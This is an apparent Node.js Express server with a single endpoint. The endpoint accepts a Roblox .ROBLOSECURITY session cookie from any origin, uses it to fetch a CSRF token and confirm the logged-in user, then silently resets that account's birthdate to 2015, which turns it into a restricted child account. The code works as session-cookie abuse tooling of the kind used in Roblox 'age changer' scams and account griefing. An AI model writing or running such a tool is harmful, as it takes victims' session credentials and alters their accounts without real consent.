import express from "express";
import fetch from "node-fetch";
import cors from "cors";
import path from "path";
import { fileURLToPath } from "url";

const app = express();
app.use(cors());
app.use(express.json());

const __dirname = path.dirname(fileURLToPath(import.meta.url));
app.use(express.static(path.join(__dirname, "public")));

app.post("/change-age", async (req, res) => {
  const { cookie } = req.body;

  if (!cookie || !cookie.includes("_|WARNING:")) {
    return res.status(400).json({ status: "invalid", error: "Missing or invalid cookie" });
  }

  try {
    // Get CSRF Token
    const csrfRes = await fetch("https://auth.roblox.com/v2/logout", {
      method: "POST",
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`
      }
    });

    const csrf = csrfRes.headers.get("x-csrf-token");
    if (!csrf) return res.status(403).json({ status: "invalid", error: "Failed to get CSRF token" });

    // Validate cookie
    const userRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`,
        "X-CSRF-TOKEN": csrf
      }
    });

    if (!userRes.ok) return res.status(401).json({ status: "invalid", error: "Invalid Roblox cookie" });

    const user = await userRes.json();

    // Change birthday
    const birthRes = await fetch("https://users.roblox.com/v1/birthdate", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-CSRF-TOKEN": csrf,
        Cookie: `.ROBLOSECURITY=${cookie}`
      },
      body: JSON.stringify({
        birthMonth: 6,
        birthDay: 5,
        birthYear: 2015
      })
    });

    if (!birthRes.ok) {
      const err = await birthRes.text();
      return res.status(500).json({ status: "failed", error: err });
    }

    return res.json({ status: "success", username: user.name });
  } catch (err) {
    return res.status(500).json({ status: "error", error: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
